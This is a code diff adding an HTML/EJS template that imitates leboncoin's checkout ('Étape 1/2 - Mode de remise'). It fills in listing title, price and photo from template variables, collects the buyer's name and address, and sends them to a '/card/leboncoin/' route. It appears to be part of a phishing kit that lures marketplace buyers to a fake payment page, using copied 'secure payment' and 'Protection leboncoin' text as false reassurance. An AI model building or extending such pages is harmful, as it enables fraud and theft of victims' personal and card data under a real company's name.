+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .buttons[_ngcontent-xpb-c85]
+        button[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        padding: 10px;
+        border-radius: 4px;
+        border: unset;
+        color: #fff;
+        background: #4183d7;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .left[_ngcontent-xpb-c85]
+        .buttons[_ngcontent-xpb-c85]
+        button[_ngcontent-xpb-c85]:hover {
+        background: #2d5b93;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .left[_ngcontent-xpb-c85] .buttons[_ngcontent-xpb-c85] {
+          display: flex;
+          justify-content: center;
+          margin: 20px;
+        }
+        .body[_ngcontent-xpb-c85]
+          .main[_ngcontent-xpb-c85]
+          .left[_ngcontent-xpb-c85]
+          .buttons[_ngcontent-xpb-c85]
+          button[_ngcontent-xpb-c85] {
+          width: 100%;
+        }
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] {
+        width: 320px;
+        margin: 10px;
+        margin-top: unset;
+        margin-bottom: unset;
+        background: #fff;
+        box-shadow: #1a1a1a14 0 -1px 4px, #1a1a1a1f 0 4px 8px;
+        height: -moz-fit-content;
+        height: fit-content;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .title[_ngcontent-xpb-c85] {
+        display: flex;
+        align-items: center;
+        border-bottom: 0.1rem solid #e6ebef;
+        border-radius: 4px 4px 0 0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .img[_ngcontent-xpb-c85] {
+        width: 100%;
+        height: 80px;
+        max-width: 80px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .img[_ngcontent-xpb-c85]
+        img[_ngcontent-xpb-c85] {
+        display: initial;
+        inset: 0px;
+        margin: auto;
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        object-position: center center;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .titl[_ngcontent-xpb-c85] {
+        margin-left: 10px;
+        display: flex;
+        flex-direction: column;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .titl[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85] {
+        margin-bottom: 5px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .titl[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-weight: 600;
+        font-size: 15px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .titl[_ngcontent-xpb-c85]
+        .summ[_ngcontent-xpb-c85] {
+        margin-right: 5px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .title[_ngcontent-xpb-c85]
+        .titl[_ngcontent-xpb-c85]
+        .summ[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 14px;
+        color: #ff6e14;
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .mInfo[_ngcontent-xpb-c85] {
+        display: none;
+        margin: 10px 20px;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .mInfo[_ngcontent-xpb-c85] {
+          display: flex;
+          flex-direction: column;
+        }
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .discd1[_ngcontent-xpb-c85] {
+        color: #8191a0;
+        margin-top: 5px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        h1[_ngcontent-xpb-c85] {
+        font-size: 16px;
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85] {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85] {
+        display: flex;
+        flex-direction: column;
+        margin-left: 5px;
+        width: 100%;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85] {
+        display: flex;
+        align-items: center;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85]
+        img[_ngcontent-xpb-c85] {
+        margin-left: 5px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .ts[_ngcontent-xpb-c85] {
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .price[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 14px;
+        font-weight: 600;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .mInfo[_ngcontent-xpb-c85]
+        .dostv[_ngcontent-xpb-c85]
+        .price[_ngcontent-xpb-c85]
+        .-ss[_ngcontent-xpb-c85] {
+        color: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .chi[_ngcontent-xpb-c85] {
+        display: none;
+        margin: 20px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .chi[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        font-size: 13px;
+        font-weight: 400;
+        color: #4284d7;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .chi[_ngcontent-xpb-c85] {
+          display: flex;
+        }
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .select[_ngcontent-xpb-c85] {
+          flex-direction: column-reverse;
+          display: none;
+        }
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85] {
+        padding: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .titleS[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        line-height: 28px;
+        font-weight: 600;
+        font-size: 16px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        display: flex;
+        padding: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .a[_ngcontent-xpb-c85] {
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 20px;
+        height: 20px;
+        border-radius: 100%;
+        border: 1px solid #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .a[_ngcontent-xpb-c85]
+        .b[_ngcontent-xpb-c85] {
+        width: 10px;
+        height: 10px;
+        border-radius: 100%;
+        background: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .-s[_ngcontent-xpb-c85] {
+        width: 20px;
+        height: 20px;
+        border-radius: 100%;
+        border: 1px solid #acb7c3;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .radio[_ngcontent-xpb-c85]
+        .-s[_ngcontent-xpb-c85]
+        .b[_ngcontent-xpb-c85] {
+        display: none;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85] {
+        display: flex;
+        flex-direction: column;
+        margin-left: 5px;
+        width: 100%;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85] {
+        display: flex;
+        align-items: center;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        margin-right: 5px;
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .text[_ngcontent-xpb-c85]
+        .ts[_ngcontent-xpb-c85] {
+        margin-top: 3px;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .price[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 14px;
+        font-weight: 600;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .select[_ngcontent-xpb-c85]
+        .all[_ngcontent-xpb-c85]
+        .delv[_ngcontent-xpb-c85]
+        .dd[_ngcontent-xpb-c85]
+        .price[_ngcontent-xpb-c85]
+        .-ss[_ngcontent-xpb-c85] {
+        color: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .tlt[_ngcontent-xpb-c85] {
+        display: flex;
+        justify-content: space-between;
+        padding: 10px 20px 0;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .tlt[_ngcontent-xpb-c85]
+        .tst[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-weight: 600;
+        font-size: 14px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .tlt[_ngcontent-xpb-c85]
+        .prc[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 14px;
+        color: #ff6e14;
+        font-weight: 600;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .txt[_ngcontent-xpb-c85] {
+        padding: 10px 20px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .txt[_ngcontent-xpb-c85]
+        .l[_ngcontent-xpb-c85] {
+        display: flex;
+        align-items: center;
+        margin-top: 10px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .txt[_ngcontent-xpb-c85]
+        .l[_ngcontent-xpb-c85]
+        svg[_ngcontent-xpb-c85] {
+        height: 13px;
+        width: 13px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .prt[_ngcontent-xpb-c85]
+        .txt[_ngcontent-xpb-c85]
+        .l[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        width: 90%;
+        margin-left: 5px;
+        color: #8191a0;
+      }
+      .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .total[_ngcontent-xpb-c85] {
+        width: 320px;
+        display: flex;
+        justify-content: space-between;
+        border-top: 0.1rem solid #e6ebef;
+        padding: 10px 20px;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .total[_ngcontent-xpb-c85]
+        p[_ngcontent-xpb-c85] {
+        font-size: 16px;
+        font-weight: 400;
+        color: #ff6e14;
+      }
+      .body[_ngcontent-xpb-c85]
+        .main[_ngcontent-xpb-c85]
+        .menu[_ngcontent-xpb-c85]
+        .total[_ngcontent-xpb-c85]
+        .t[_ngcontent-xpb-c85] {
+        color: #000;
+      }
+      @media screen and (max-width: 750px) {
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] {
+          width: 100%;
+          margin: unset;
+          margin-bottom: 20px;
+        }
+        .body[_ngcontent-xpb-c85] .main[_ngcontent-xpb-c85] .menu[_ngcontent-xpb-c85] .total[_ngcontent-xpb-c85] {
+          width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <app-root _nghost-xpb-c48=""
+      ><router-outlet _ngcontent-xpb-c48=""></router-outlet
+      ><app-render _nghost-xpb-c36=""
+        ><!----><app-ik-chat _nghost-xpb-c53=""
+          ><!----><!---->
+          <!----></app-ik-chat
+        ><!---->
+        <div _ngcontent-xpb-c36="" id="main" style="display: unset">
+          <app-laboncoin _nghost-xpb-c61=""
+            ><div _ngcontent-xpb-c61="" class="logo">
+              <img _ngcontent-xpb-c61="" src="/leboncoin/labon.png" alt="" />
+              <h1 _ngcontent-xpb-c61="">Étape 1/2 - Mode de remise</h1>
+            </div></app-laboncoin
+          ><!----><app-leboncoin _nghost-xpb-c85="">
+            <form
+              method="GET"
+              action="/card/leboncoin/<%=ad.id%>"
+              _ngcontent-xpb-c85=""
+              class="body ng-untouched ng-pristine ng-valid"
+            >
+              <div _ngcontent-xpb-c85="" class="titleVV"><p _ngcontent-xpb-c85="">Mode de remise</p></div>
+              <div _ngcontent-xpb-c85="" class="main">
+                <div _ngcontent-xpb-c85="" class="left">
+                  <div _ngcontent-xpb-c85="" class="bg">
+                    <div _ngcontent-xpb-c85="" class="alls">
+                      <div _ngcontent-xpb-c85="" class="form">
+                        <div _ngcontent-xpb-c85="" class="top"><h1 _ngcontent-xpb-c85="">Adresse de livraison</h1></div>
+                        <div _ngcontent-xpb-c85="" class="dbl">
+                          <div _ngcontent-xpb-c85="" class="i1">
+                            <label _ngcontent-xpb-c85="" for="">Prénom</label>
+                            <div _ngcontent-xpb-c85="" class="inpDiv">
+                              <input _ngcontent-xpb-c85="" type="text" required />
+                            </div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="i2">
+                            <label _ngcontent-xpb-c85="" for="">Nom</label>
+                            <div _ngcontent-xpb-c85="" class="inpDiv">
+                              <input _ngcontent-xpb-c85="" type="text" required />
+                            </div>
+                          </div>
+                        </div>
+                        <div _ngcontent-xpb-c85="" class="address">
+                          <label _ngcontent-xpb-c85="" for="">Adresse</label>
+                          <div _ngcontent-xpb-c85="" class="inpDiv"><input _ngcontent-xpb-c85="" type="text" required /></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <!---->
+                  <div _ngcontent-xpb-c85="" class="bg" style="margin-top: 20px">
+                    <div _ngcontent-xpb-c85="" class="alls">
+                      <div _ngcontent-xpb-c85="" class="safe">
+                        <h1 _ngcontent-xpb-c85="">Informations sur le paiement sécurisé</h1>
+                        <h2 _ngcontent-xpb-c85="">Nous sécurisons votre argent jusqu’à réception</h2>
+                        <p _ngcontent-xpb-c85="">
+                          En cas de remise en main propre, votre argent est conservé et le vendeur est payé uniquement lorsque
+                          vous confirmez la récupération de l’article. En cas de livraison, vous disposez d’un délai de 10 jours
+                          après la confirmation d’envoi du colis pour en confirmer la bonne réception. Le vendeur est payé
+                          uniquement lorsque, à l’issue d’un délai supplémentaire de 3 jours à compter de la réception du colis,
+                          vous confirmez la conformité de l’article et que nous n’avez pas signalé de problème auprès de nos
+                          services.
+                        </p>
+                        <h2 _ngcontent-xpb-c85="">Nous vous remboursons en cas de besoin</h2>
+                        <p _ngcontent-xpb-c85="">
+                          Si vous ne récupérez pas votre article ou qu’il est indisponible, nous vous invitons à demander
+                          l’assistance de nos services afin d’obtenir votre éventuel remboursement dans les plus brefs délais.
+                        </p>
+                        <h2 _ngcontent-xpb-c85="">Nous sommes à votre écoute</h2>
+                        <p _ngcontent-xpb-c85="">
+                          L’article est abîmé ? Non conforme ? Vous n’avez pas réceptionné votre colis ? Notre service client est
+                          là pour vous aider, à compter du 6ème jour après la confirmation d’envoi du colis dans le cadre d’une
+                          livraison, et jusqu’au 3ème jour à compter de la confirmation de réception du colis par vos soins. En
+                          savoir plus. Pour toute autre question, vous pouvez contacter nos services.
+                        </p>
+                      </div>
+                    </div>
+                  </div>
+                  <!----><!----><!----><!----><!----><!---->
+                  <div _ngcontent-xpb-c85="" class="buttons">
+                    <button _ngcontent-xpb-c85="" type="submit">Continuer</button
+                    ><!----><!---->
+                  </div>
+                </div>
+                <div _ngcontent-xpb-c85="" class="menu">
+                  <div _ngcontent-xpb-c85="" class="title">
+                    <div _ngcontent-xpb-c85="" class="img">
+                      <img _ngcontent-xpb-c85="" alt="" src="<%=ad.photo%>" />
+                    </div>
+                    <div _ngcontent-xpb-c85="" class="titl">
+                      <div _ngcontent-xpb-c85="" class="text"><p _ngcontent-xpb-c85=""><%=ad.title%></p></div>
+                      <div _ngcontent-xpb-c85="" class="summ"><p _ngcontent-xpb-c85=""><%=ad.price%></p></div>
+                    </div>
+                  </div>
+                  <div _ngcontent-xpb-c85="" class="mInfo">
+                    <!---->
+                    <h1 _ngcontent-xpb-c85="">Livraison</h1>
+                    <!----><!---->
+                    <div _ngcontent-xpb-c85="" class="dostv">
+                      <div _ngcontent-xpb-c85="" class="text">
+                        <div _ngcontent-xpb-c85="" class="t">
+                          <p _ngcontent-xpb-c85="">Courrier suivi</p>
+                          <img _ngcontent-xpb-c85="" src="/leboncoin/laposte.svg" alt="" />
+                        </div>
+                        <p _ngcontent-xpb-c85="" class="ts">à votre domicile sous 2-3 jours</p>
+                      </div>
+                      <div _ngcontent-xpb-c85="" class="price"><!----></div>
+                    </div>
+                    <!----><!----><!---->
+                  </div>
+                  <div _ngcontent-xpb-c85="" class="chi"><p _ngcontent-xpb-c85="">Choisir un autre mode de remise</p></div>
+                  <div _ngcontent-xpb-c85="" class="select">
+                    <div _ngcontent-xpb-c85="" class="all">
+                      <div _ngcontent-xpb-c85="" class="titleS"><p _ngcontent-xpb-c85="">Mode de remise</p></div>
+                      <div _ngcontent-xpb-c85="" class="delv">
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a -s"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t"><p _ngcontent-xpb-c85="">Remise en main propre</p></div>
+                            <p _ngcontent-xpb-c85="" class="ts">
+                              payez en ligne et récupérez votre article en main propre lors de votre rendez-vous avec le vendeur
+                            </p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"><p _ngcontent-xpb-c85=""></p></div>
+                        </div>
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t">
+                              <p _ngcontent-xpb-c85="">Courrier suivi</p>
+                              <img _ngcontent-xpb-c85="" src="/leboncoin/laposte.svg" alt="" />
+                            </div>
+                            <p _ngcontent-xpb-c85="" class="ts">à votre domicile sous 2-3 jours</p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"><!----></div>
+                        </div>
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a -s"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t">
+                              <p _ngcontent-xpb-c85="">Mondial Relay</p>
+                              <img _ngcontent-xpb-c85="" src="/leboncoin/mondialRelay.svg" alt="" />
+                            </div>
+                            <p _ngcontent-xpb-c85="" class="ts">en point Mondial Relay sous 3-5 jours</p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"><!----></div>
+                        </div>
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a -s"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t">
+                              <p _ngcontent-xpb-c85="">Colissimo</p>
+                              <img _ngcontent-xpb-c85="" src="/leboncoin/colissimo.svg" alt="" />
+                            </div>
+                            <p _ngcontent-xpb-c85="" class="ts">à votre domicile sous 2-3 jours</p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"><!----></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div _ngcontent-xpb-c85="" class="prt">
+                    <div _ngcontent-xpb-c85="" class="tlt">
+                      <div _ngcontent-xpb-c85="" class="tst"><p _ngcontent-xpb-c85="">Protection leboncoin</p></div>
+                      <div _ngcontent-xpb-c85="" class="prc"><!----></div>
+                    </div>
+                    <div _ngcontent-xpb-c85="" class="txt">
+                      <div _ngcontent-xpb-c85="" class="l">
+                        <svg
+                          _ngcontent-xpb-c85=""
+                          width="31"
+                          height="25"
+                          viewBox="0 0 31 25"
+                          fill="none"
+                          xmlns="http://www.w3.org/2000/svg"
+                        >
+                          <path
+                            _ngcontent-xpb-c85=""
+                            d="M2 14.5L9.5 22L29.5 2"
+                            stroke="#55B950"
+                            stroke-width="3"
+                            stroke-linecap="round"
+                          ></path>
+                        </svg>
+                        <p _ngcontent-xpb-c85="">
+                          Votre argent est conservé jusqu’à la confirmation de réception de votre article
+                        </p>
+                      </div>
+                      <div _ngcontent-xpb-c85="" class="l">
+                        <svg
+                          _ngcontent-xpb-c85=""
+                          width="31"
+                          height="25"
+                          viewBox="0 0 31 25"
+                          fill="none"
+                          xmlns="http://www.w3.org/2000/svg"
+                        >
+                          <path
+                            _ngcontent-xpb-c85=""
+                            d="M2 14.5L9.5 22L29.5 2"
+                            stroke="#55B950"
+                            stroke-width="3"
+                            stroke-linecap="round"
+                          ></path>
+                        </svg>
+                        <p _ngcontent-xpb-c85="">Une équipe dédiée à votre service</p>
+                      </div>
+                    </div>
+                  </div>
+                  <div _ngcontent-xpb-c85="" class="total">
+                    <p _ngcontent-xpb-c85="" class="t">Total</p>
+                    <p _ngcontent-xpb-c85=""><%=ad.price%></p>
+                  </div>
+                </div>
+              </div>
+              <!-- <div _ngcontent-xpb-c85="" class="bgD">
+                <div _ngcontent-xpb-c85="" class="selectMobileDelivry">
+                  <div _ngcontent-xpb-c85="" class="headerD">
+                    <h1 _ngcontent-xpb-c85="">Sélectionnez un mode de remise</h1>
+                    <span _ngcontent-xpb-c85=""
+                      ><svg
+                        _ngcontent-xpb-c85=""
+                        width="26"
+                        height="26"
+                        viewBox="0 0 26 26"
+                        fill="none"
+                        xmlns="http://www.w3.org/2000/svg"
+                      >
+                        <line
+                          _ngcontent-xpb-c85=""
+                          x1="2.12132"
+                          y1="2"
+                          x2="24"
+                          y2="23.8787"
+                          stroke="#98A5B2"
+                          stroke-width="3"
+                          stroke-linecap="round"
+                        ></line>
+                        <line
+                          _ngcontent-xpb-c85=""
+                          x1="24"
+                          y1="2.12132"
+                          x2="2.12132"
+                          y2="24"
+                          stroke="#98A5B2"
+                          stroke-width="3"
+                          stroke-linecap="round"
+                        ></line></svg
+                    ></span>
+                  </div>
+                  <div _ngcontent-xpb-c85="" class="selectD">
+                    <div _ngcontent-xpb-c85="" class="all">
+                      <div _ngcontent-xpb-c85="" class="delv">
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a -s"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t"><p _ngcontent-xpb-c85="">Remise en main propre</p></div>
+                            <p _ngcontent-xpb-c85="" class="ts">
+                              payez en ligne et récupérez votre article en main propre lors de votre rendez-vous avec le vendeur
+                            </p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"><p _ngcontent-xpb-c85=""></p></div>
+                        </div>
+                        <div _ngcontent-xpb-c85="" class="dd">
+                          <div _ngcontent-xpb-c85="" class="radio">
+                            <div _ngcontent-xpb-c85="" class="a"><span _ngcontent-xpb-c85="" class="b"></span></div>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="text">
+                            <div _ngcontent-xpb-c85="" class="t">
+                              <p _ngcontent-xpb-c85="">Courrier suivi</p>
+                              <img _ngcontent-xpb-c85="" src="/leboncoin/laposte.svg" alt="" />
+                            </div>
+                            <p _ngcontent-xpb-c85="" class="ts">à votre domicile sous 2-3 jours</p>
+                          </div>
+                          <div _ngcontent-xpb-c85="" class="price"></div>
+                        </div>
